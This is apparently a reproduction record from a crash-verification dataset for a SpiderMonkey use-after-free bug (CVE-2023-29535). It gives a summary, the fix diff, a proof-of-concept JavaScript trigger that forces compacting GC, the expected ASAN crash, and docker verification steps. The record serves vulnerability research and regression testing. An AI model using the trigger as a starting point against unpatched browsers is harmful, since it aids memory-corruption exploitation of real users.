# Bugzilla 1820543 / CVE-2023-29535

**Title:** Memory corruption after garbage collection — stale FinalizationRegistry observer edge over relocated WeakMap cell
**Severity:** sec-high (MFSA 2023-13, Firefox 112)
**Component:** SpiderMonkey — GC compaction — `js/src/gc/Compacting.cpp`
**Fix commit:** `533d5be1269d680dbef53e0116a917f1a7485e9d` ("Bug 1820543 - Update weak maps before finalization observer edges when compacting r=sfink", Jon Coppeard, 2023-03-15)
**Vulnerable revision:** `533d5be1269d680dbef53e0116a917f1a7485e9d~1`
**Reporter:** Lukas Bernhard

## Summary

SpiderMonkey's compacting garbage collector walks every Cell that
survived and rewrites pointers to their post-move addresses
(`GCRuntime::updatePointersToRelocatedCells`). The update pass touches
two groups of edges:

1. Weak maps — each entry's key/value pointer migrated to the new
   location.
2. `FinalizationRegistry` observer edges — each registered target
   pointer fixed up the same way.

Pre-fix, the observer pass ran *before* the weak-map pass. A
`FinalizationRegistry` whose registered target pointed into a WeakMap
entry held a stale pointer after the observer update because the
WeakMap it lived in had not yet been rewritten. Any subsequent read
from that observer dereferenced a freed / already-moved `Cell` — a
heap use-after-free.

Regression from Bug 1749298 (Firefox 95+).

## Fix

```cpp
// js/src/gc/Compacting.cpp — fix reorders the passes
- sweepFinalizationObservers();
- zone->weakMapDependencies().update();
+ zone->weakMapDependencies().update();        // weak maps FIRST
+ sweepFinalizationObservers();
```

Observer updates now observe already-relocated weak-map pointers, so
no stale cell references survive.

## Trigger (`poc.js`, from Bugzilla attachment by Lukas Bernhard)

```js
const v1 = ("DEB1").startsWith("DEB1");
function f2(a3, a4, a5, a6) {
    return ({"constructor":this,"b":a3,"__proto__":this}).newGlobal(f2);
}
f2.newCompartment = v1;
with (f2()) {
    function f11(a12, a13) {
        return "DEB1";
    }
    const v15 = new FinalizationRegistry(f11);
    v15.register(f2);
}
this.reportLargeAllocationFailure();
gc()
```

1. `newGlobal` spawns a second compartment.
2. `FinalizationRegistry` registers `f2` for a callback that returns
   a constant.
3. `reportLargeAllocationFailure()` forces the large-alloc failure
   path that triggers compacting GC.
4. `gc()` runs the compaction; the observer walk sees pre-move weak
   map cells and dereferences the stale pointer.

## Expected crash

Debug+ASAN: `MOZ_CRASH` / `MOZ_ASSERT` on Cell header
(`js/src/gc/Cell.h:836`) OR ASAN **heap-use-after-free** on
`js::gc::Cell` inside the observer walk during
`GCRuntime::updatePointersToRelocatedCells`.

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:1820543 spidermonkey/1820543
bash spidermonkey/crash_check.sh 1820543
```

Expected: `CONFIMRED: ASAN_CRASH`.
